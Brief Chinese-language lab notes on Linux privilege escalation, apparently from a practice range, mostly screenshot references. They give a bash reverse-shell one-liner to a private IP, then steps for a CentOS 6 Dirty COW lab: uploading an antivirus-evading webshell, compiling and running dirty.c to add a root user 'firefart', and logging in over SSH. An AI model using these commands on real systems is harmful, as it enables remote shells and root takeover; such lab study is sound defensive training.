#Linux提权



![image-20210825091349543](Linux提权\image-20210825091349543.png)



反弹shell

bash -i >& /dev/tcp/172.16.12.171/8888  0>&1



#centos6脏牛提权_基础实验

![image-20210825125641690](Linux提权\image-20210825125641690.png)

目标位置上传as免杀马

as链接

![image-20210825125752200](Linux提权\image-20210825125752200.png)

打开终端，ls查看 

执行gcc -pthread dirty.c -o cow -lcrypt 编译命令，生成文件

![image-20210825125917626](Linux提权\image-20210825125917626.png)

接着执行 ./cow 123   ,生成新密码

cat /etc/passwd

已经生成了root权限的用户firefart

![image-20210825132225653](Linux提权\image-20210825132225653.png)

打开终端 远程链接  ssh firefart@172.16.12.2 输入密码

whoami查看  













#靶场：ubuntu14脏牛提权_基础实验